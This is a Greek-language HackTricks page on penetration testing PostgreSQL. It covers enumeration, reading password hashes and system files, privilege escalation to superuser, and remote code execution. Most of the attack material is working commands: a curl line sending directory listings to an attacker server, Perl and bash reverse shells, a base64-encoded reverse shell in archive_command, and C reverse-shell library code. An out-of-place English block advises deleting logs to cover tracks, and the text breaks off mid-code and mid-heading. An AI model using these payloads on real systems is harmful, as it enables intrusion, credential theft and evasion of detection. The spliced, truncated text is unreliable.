# 5432,5433 - Ελέγχος Εισβολής στο PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Βασικές Πληροφορίες**

Το **PostgreSQL** περιγράφεται ως ένα **σύστημα βάσης δεδομένων αντικειμενοστραφές** που είναι **ανοικτού κώδικα**. Αυτό το σύστημα όχι μόνο χρησιμοποιεί τη γλώσσα SQL αλλά την ενισχύει και με επιπλέον χαρακτηριστικά. Οι δυνατότητές του του επιτρέπουν να χειριστεί μια μεγάλη ποικιλία τύπων δεδομένων και λειτουργιών, κάνοντάς το μια ευέλικτη επιλογή για προγραμματιστές και οργανισμούς.

**Προεπιλεγμένη θύρα:** 5432, και αν αυτή η θύρα είναι ήδη σε χρήση, φαίνεται ότι το postgresql θα χρησιμοποιήσει την επόμενη θύρα (πιθανότατα 5433) η οποία δεν είναι σε χρήση.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Σύνδεση & Βασική Απαρίθμηση
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Εάν εκτελέσετε την εντολή **`\list`** και βρείτε μια βάση δεδομένων με το όνομα **`rdsadmin`**, τότε γνωρίζετε ότι βρίσκεστε μέσα σε μια βάση δεδομένων **AWS PostgreSQL**.
{% endhint %}

Για περισσότερες πληροφορίες σχετικά με **πώς να καταχραστείτε μια βάση δεδομένων PostgreSQL** ελέγξτε:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Αυτόματη Απαρίθμηση
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Χυδαία επίθεση**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Σάρωση θυρών**

Σύμφωνα με [**αυτή την έρευνα**](https://www.exploit-db.com/papers/13084), όταν μια προσπάθεια σύνδεσης αποτυγχάνει, το `dblink` εκτοξεύει μια εξαίρεση `sqlclient_unable_to_establish_sqlconnection` περιλαμβάνοντας μια εξήγηση του σφάλματος. Παραδείγματα αυτών των λεπτομερειών παρατίθενται παρακάτω.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* Ο Φιλοξενητής είναι εκτός σύνδεσης

```DETAIL: δεν ήταν δυνατή η σύνδεση στον διακομιστή: Δεν υπάρχει διαδρομή για τον φιλοξενητή. Εκτελείται ο διακομιστής στον φιλοξενητή "1.2.3.4" και δέχεται συνδέσεις TCP/IP στη θύρα 5678;```

* Η θύρα είναι κλειστή
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Η θύρα είναι ανοιχτή
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```markdown
## PostgreSQL

### Enumeration

To discover PostgreSQL services running on the target system, you can use tools like Nmap or Metasploit. Nmap can be used to scan for open ports, while Metasploit can help in identifying vulnerabilities in the PostgreSQL service.

### Default Credentials

PostgreSQL does not have default credentials, but it's common for users to set weak passwords or reuse credentials. Always try default credentials like `postgres:postgres` or common passwords during your penetration testing.

### Brute Forcing

If default credentials do not work, you can attempt to brute force the PostgreSQL login using tools like Hydra or Metasploit. Make sure to use a good wordlist and set up proper rate limiting to avoid account lockouts.

### Exploitation

Once you have valid credentials or have successfully brute forced the login, you can exploit vulnerabilities in the PostgreSQL service to gain access to the database or execute commands on the underlying system.

### Post-Exploitation

After gaining access, you can perform various post-exploitation activities like dumping data, creating backdoors, or escalating privileges. Tools like pg_dump can be used to extract data from the PostgreSQL database.

### Covering Tracks

To cover your tracks, make sure to delete any logs or evidence of your activities on the PostgreSQL server. This can help avoid detection and maintain access to the system for future exploitation.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Η θύρα είναι ανοιχτή ή φιλτραρισμένη
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## Απαρίθμηση Προνομίων

### Ρόλοι

| Τύποι Ρόλων   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Ο ρόλος έχει προνόμια υπερχρήστη                                                                                                                |
| rolinherit     | Ο ρόλος κληρονομεί αυτόματα τα προνόμια των ρόλων στους οποίους ανήκει                                                                            |
| rolcreaterole  | Ο ρόλος μπορεί να δημιουργήσει περισσότερους ρόλους                                                                                              |
| rolcreatedb    | Ο ρόλος μπορεί να δημιουργήσει βάσεις δεδομένων                                                                                                  |
| rolcanlogin    | Ο ρόλος μπορεί να συνδεθεί. Δηλαδή, αυτός ο ρόλος μπορεί να δοθεί ως αναγνωριστικό αρχικής συνεδρίας                                      |
| rolreplication | Ο ρόλος είναι ρόλος αναπαραγωγής. Ένας ρόλος αναπαραγωγής μπορεί να εκκινήσει συνδέσεις αναπαραγωγής και να δημιουργήσει και να διαγράψει υποδοχές αναπαραγωγής. |
| rolconnlimit   | Για ρόλους που μπορούν να συνδεθούν, ορίζει το μέγιστο αριθμό ταυτόχρονων συνδέσεων που μπορεί να πραγματοποιήσει αυτός ο ρόλος. Το -1 σημαίνει ότι δεν υπάρχει όριο. |
| rolpassword    | Όχι ο κωδικός πρόσβασης (διαβάζεται πάντα ως `********`)                                                                                           |
| rolvaliduntil  | Χρόνος λήξης κωδικού (χρησιμοποιείται μόνο για πιστοποίηση κωδικού πρόσβασης); null αν δεν υπάρχει λήξη                                |
| rolbypassrls   | Ο ρόλος παρακάμπτει κάθε πολιτική ασφαλείας επιπέδου γραμμής, δείτε [Ενότητα 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) για περισσότερες πληροφορίες. |
| rolconfig      | Προεπιλογές ρόλου για μεταβλητές ρύθμισης κατά την εκτέλεση                                                                                      |
| oid            | ID του ρόλου                                                                                                                                       |

#### Ενδιαφέρουσες Ομάδες

* Αν είστε μέλος του **`pg_execute_server_program`** μπορείτε να **εκτελέσετε** προγράμματα
* Αν είστε μέλος του **`pg_read_server_files`** μπορείτε να **διαβάσετε** αρχεία
* Αν είστε μέλος του **`pg_write_server_files`** μπορείτε να **γράψετε** αρχεία

{% hint style="info" %}
Σημειώστε ότι στο Postgres ένας **χρήστης**, μια **ομάδα** και ένας **ρόλος** είναι το **ίδιο**. Απλά εξαρτάται από το **πώς το χρησιμοποιείτε** και αν του επιτρέπετε να **συνδεθεί**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Πίνακες
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Λειτουργίες
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Ενέργειες συστήματος αρχείων

### Διαβάστε καταλόγους και αρχεία

Από αυτήν την [**αλλαγή**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) μέλη της ορισμένης ομάδας **`DEFAULT_ROLE_READ_SERVER_FILES`** (που ονομάζεται **`pg_read_server_files`**) και **υπερχρήστες** μπορούν να χρησιμοποιήσουν τη μέθοδο **`COPY`** σε οποιοδήποτε διαδρομή (ελέγξτε το `convert_and_check_filename` στο `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε δικαιώματα **CREATEROLE** μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_read_server_files TO username;
```
[**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Υπάρχουν **άλλες λειτουργίες της postgres** που μπορούν να χρησιμοποιηθούν για **ανάγνωση αρχείου ή εμφάνιση λίστας φακέλων**. Μόνο **υπερχρήστες** και **χρήστες με συγκεκριμένες άδειες** μπορούν να τις χρησιμοποιήσουν:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Μπορείτε να βρείτε **περισσότερες λειτουργίες** στο [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Απλή Εγγραφή Αρχείου

Μόνο **υπερχρήστες** και μέλη του **`pg_write_server_files`** μπορούν να χρησιμοποιήσουν την εντολή copy για την εγγραφή αρχείων.

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε δικαιώματα **`CREATEROLE`** μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_write_server_files TO username;
```
[**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Να θυμάστε ότι το COPY δεν μπορεί να χειριστεί χαρακτήρες νέας γραμμής, επομένως ακόμη και αν χρησιμοποιείτε ένα payload base64 **πρέπει να στείλετε μια γραμμή**.\
Ένα πολύ σημαντικό περιορισμός αυτής της τεχνικής είναι ότι **το `copy` δεν μπορεί να χρησιμοποιηθεί για την εγγραφή δυαδικών αρχείων καθώς τροποποιεί μερικές δυαδικές τιμές.**

### **Μεταφόρτωση δυαδικών αρχείων**

Ωστόσο, υπάρχουν **άλλες τεχνικές για τη μεταφόρτωση μεγάλων δυαδικών αρχείων:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Συμβουλή bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty δημιουργημένη από χάκερς, για χάκερς**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα, και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Ενημέρωση δεδομένων πίνακα PostgreSQL μέσω εγγραφής τοπικού αρχείου

Αν έχετε τις απαραίτητες άδειες για να διαβάσετε και να γράψετε αρχεία εξυπηρετητή PostgreSQL, μπορείτε να ενημερώσετε οποιονδήποτε πίνακα στον εξυπηρετητή με το **αντικατάσταση του συσχετισμένου κόμβου αρχείου** στο [κατάλογο δεδομένων του PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Περισσότερα για αυτήν την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Απαιτούμενα βήματα:

1. Αποκτήστε τον κατάλογο δεδομένων του PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Σημείωση:** Αν δεν μπορείτε να ανακτήσετε την τρέχουσα διαδρομή του καταλόγου δεδομένων από τις ρυθμίσεις, μπορείτε να ερωτήσετε την κύρια έκδοση του PostgreSQL μέσω του ερωτήματος `SELECT version()` και να προσπαθήσετε να βρείτε τη διαδρομή με brute-force. Οι συνήθεις διαδρομές καταλόγων δεδομένων σε εγκαταστάσεις Unix του PostgreSQL είναι `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Ένα συνηθισμένο όνομα cluster είναι το `main`.
2. Αποκτήστε μια σχετική διαδρομή προς τον κόμβο αρχείου, που συσχετίζεται με τον στόχο πίνακα

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Αυτό το ερώτημα θα επιστρέψει κάτι σαν `base/3/1337`. Η πλήρης διαδρομή στο δίσκο θα είναι `$DATA_DIRECTORY/base/3/1337`, δηλαδή `/var/lib/postgresql/13/main/base/3/1337`.
3. Κατεβάστε τον κόμβο αρχείου μέσω των λειτουργιών `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. Λάβετε τον τύπο δεδομένων, που συσχετίζεται με τον στόχο πίνακα

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. Χρησιμοποιήστε το [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείτε τον κόμβο αρχείου](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ορίστε όλες τις boolean σημαίες `rol*` σε 1 για πλήρεις άδειες.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Επίδειξη PostgreSQL Filenode Editor](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. Επαναφορτώστε τον επεξεργασμένο κόμβο αρχείου μέσω των λειτουργιών `lo_*`, και αντικαταστήστε το αρχικό αρχείο στο δίσκο

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(Προαιρετικά)_ Καθαρίστε τη μνήμη cache του πίνακα εκτελώντας ένα δαπανηρό ερώτημα SQL

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. Θα πρέπει τώρα να δείτε ενημερωμένες τιμές πίνακα στο PostgreSQL.

Μπορείτε επίσης να γίνετε υπερδιαχειριστής επεξεργάζοντας τον πίνακα `pg_authid`. **Δείτε** [**την ακόλουθη ενότητα**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE σε πρόγραμμα**

Από την [έκδοση 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), μόνο **υπερχρήστες** και μέλη της ομάδας **`pg_execute_server_program`** μπορούν να χρησιμοποιήσουν το copy για RCE (παράδειγμα με εξυπντήριση:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Παράδειγμα εκτέλεσης:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
Να θυμάστε ότι αν δεν είστε υπερχρήστης αλλά έχετε δικαιώματα **`CREATEROLE`** μπορείτε **να γίνετε μέλος αυτής της ομάδας:**
```sql
GRANT pg_execute_server_program TO username;
```
[**Περισσότερες πληροφορίες.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

Ή χρησιμοποιήστε το module `multi/postgres/postgres_copy_from_program_cmd_exec` από το **metasploit**.\
Περισσότερες πληροφορίες σχετικά με αυτήν την ευπάθεια [**εδώ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Ενώ αναφέρεται ως CVE-2019-9193, η Postges δήλωσε ότι αυτό ήταν ένα [χαρακτηριστικό και δεν θα διορθωθεί](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE με Γλώσσες PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE με επεκτάσεις PostgreSQL

Αφού έχετε **μάθει** από την προηγούμενη ανάρτηση **πώς να μεταφορτώσετε δυαδικά αρχεία** μπορείτε να δοκιμάσετε να **αποκτήσετε RCE με τη μεταφόρτωση μιας επέκτασης postgresql και τη φόρτωσή της**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE με το αρχείο ρύθμισης του PostgreSQL

{% hint style="info" %}
Οι ακόλουθοι διανύσματα RCE είναι ιδιαίτερα χρήσιμα σε περιορισμένα πλαίσια SQLi, καθώς όλα τα βήματα μπορούν να εκτελεστούν μέσω εμφωλιασμένων δηλώσεων SELECT
{% endhint %}

Το **αρχείο ρύθμισης** του PostgreSQL είναι **εγγράψιμο** από τον χρήστη **postgres**, ο οποίος εκτελεί τη βάση δεδομένων, οπότε ως **υπερχρήστης**, μπορείτε να γράψετε αρχεία στο σύστημα αρχείων, και συνεπώς μπορείτε να **αντικαταστήσετε αυτό το αρχείο.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE με ssl\_passphrase\_command**

Περισσότερες πληροφορίες [σχετικά με αυτήν την τεχνική εδώ](https://pulsesecurity.co.nz/articles/postgres-sqli).

Το αρχείο ρύθμισης έχει κάποια ενδιαφέροντα χαρακτηριστικά που μπορούν να οδηγήσουν σε RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Διαδρομή προς τον ιδιωτικό κλειδί της βάσης δεδομένων
* `ssl_passphrase_command = ''` Αν το ιδιωτικό αρχείο προστατεύεται με κωδικό πρόσβασης (κρυπτογραφημένο) το postgresql θα **εκτελέσει την εντολή που υποδεικνύεται σε αυτό το χαρακτηριστικό**.
* `ssl_passphrase_command_supports_reload = off` **Αν** αυτό το χαρακτηριστικό είναι **ενεργοποιημένο** η **εντολή** που εκτελείται αν το κλειδί προστατεύεται με κωδικό πρόσβασης **θα εκτελεστεί** όταν εκτελείται το `pg_reload_conf()`.

Στη συνέχεια, ένας επιτιθέμενος θα πρέπει:

1. **Ανάκτηση ιδιωτικού κλειδιού** από τον διακομιστή
2. **Κρυπτογράφηση** του κατεβασμένου ιδιωτικού κλειδιού:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Αντικατάσταση**
4. **Ανάκτηση** της τρέχουσας **ρύθμισης** του postgresql
5. **Αντικατάσταση** της **ρύθμισης** με την ρύθμιση των αναφερόμενων χαρακτηριστικών:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Εκτέλεση `pg_reload_conf()`

Κατά τη δοκιμή αυτής της τεχνικής παρατήρησα ότι αυτό θα λειτουργήσει μόνο εάν το **ιδιωτικό κλειδί έχει δικαιώματα 640**, είναι **κατοχυρωμένο από το root** και από τη **συγκεκριμένη ομάδα ssl-cert ή postgres** (ώστε ο χρήστης postgres να μπορεί να το διαβάσει), και βρίσκεται στο _/var/lib/postgresql/12/main_.

#### **RCE με archive\_command**

**Περισσότερες** [**πληροφορίες για αυτήν τη ρύθμιση και για το WAL εδώ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Ένα άλλο χαρακτηριστικό στο αρχείο ρύθμισης που είναι εκμεταλλεύσιμο είναι το `archive_command`.

Για να λειτουργήσει αυτό, η ρύθμιση `archive_mode` πρέπει να είναι `'on'` ή `'always'`. Αν αυτό ισχύει, τότε μπορούμε να αντικαταστήσουμε την εντολή στο `archive_command` και να την εξαναγκάσουμε να εκτελεστεί μέσω των λειτουργιών WAL (write-ahead logging).

Τα γενικά βήματα είναι:

1. Έλεγχος εάν η λειτουργία αρχειοθέτησης είναι ενεργοποιημένη: `SELECT current_setting('archive_mode')`
2. Αντικατάσταση του `archive_command` με το payload. Για παράδειγμα, ένα αντίστροφο κέλυφος: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Επαναφόρτωση της ρύθμισης: `SELECT pg_reload_conf()`
4. Εξαναγκάστε τη λειτουργία WAL να τρέξει, η οποία θα καλέσει την εντολή αρχειοθέτησης: `SELECT pg_switch_wal()` ή `SELECT pg_switch_xlog()` για μερικές εκδόσεις του Postgres

#### **RCE με βιβλιοθήκες preload**

Περισσότερες πληροφορίες [σχετικά με αυτήν την τεχνική εδώ](https://adeadfed.com/posts/postgresql-select-only-rce/).

Αυτό το διάνυσμα επίθεσης εκμεταλλεύεται τις ακόλουθες μεταβλητές ρύθμισης:

* `session_preload_libraries` -- βιβλιοθήκες που θα φορτωθούν από τον διακομιστή PostgreSQL κατά τη σύνδεση του πελάτη.
* `dynamic_library_path` -- λίστα καταλόγων όπου ο διακομιστής PostgreSQL θα αναζητήσει τις βιβλιοθήκες.

Μπορούμε να ορίσουμε την τιμή του `dynamic_library_path` σε έναν κατάλογο, εγγράψιμο από τον χρήστη `postgres` που εκτελεί τη βάση δεδομένων, για παράδειγμα, τον κατάλογο `/tmp/`, και να μεταφορτώσουμε ένα κακόβουλο αντικείμενο `.so` εκεί. Στη συνέχεια, θα εξαναγκάσουμε τον διακομιστή PostgreSQL να φορτώσει τη νεομεταφορτωμένη μας βιβλιοθήκη περιλαμβάνοντάς την στη μεταβλητή `session_preload_libraries`.

Τα βήματα της επίθεσης είναι:

1. Λήψη του αρχικού `postgresql.conf`
2. Συμπερίληψη του καταλόγου `/tmp/` στην τιμή του `dynamic_library_path`, π.χ. `dynamic_library_path = '/tmp:$libdir'`
3. Συμπερίληψη του ονόματος της κακόβουλης βιβλιοθήκης στην τιμή του `session_preload_libraries`, π.χ. `session_preload_libraries = 'payload.so'`
4. Έλεγχος της κύριας έκδοσης PostgreSQL μέσω της ερώτησης `SELECT version()`
5.  Σύνθεση του κώδικα της κακόβουλης βιβλιοθήκης με το σωστό πακέτο ανάπτυξης PostgreSQL Δείγμα κώδικα:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt
## **Postgres Ανύψωση Δικαιωμάτων**

### Ανύψωση Δικαιωμάτων CREATEROLE

#### **Χορήγηση**

Σύμφωνα με τα [**έγγραφα**](https://www.postgresql.org/docs/13/sql-grant.html): _Οι ρόλοι που έχουν το προνόμιο **`CREATEROLE`** μπορούν **να χορηγήσουν ή να ανακαλέσουν την συμμετοχή σε οποιονδήποτε ρόλο** που **δεν** είναι **υπερχρήστης**._

Έτσι, αν έχετε την άδεια **`CREATEROLE`** μπορείτε να χορηγήσετε στον εαυτό σας πρόσβαση σε άλλους **ρόλους** (που δεν είναι υπερχρήστες) που μπορεί να σας δώσουν τη δυνατότητα να διαβάσετε και να γράψετε αρχεία και να εκτελέσετε εντολές:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Τροποποίηση Κωδικού Πρόσβασης

Οι χρήστες με αυτόν τον ρόλο μπορούν επίσης να **τροποποιήσουν** τους **κωδικούς πρόσβασης** άλλων **μη-υπερχρηστών**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Ανέβασμα σε SUPERUSER

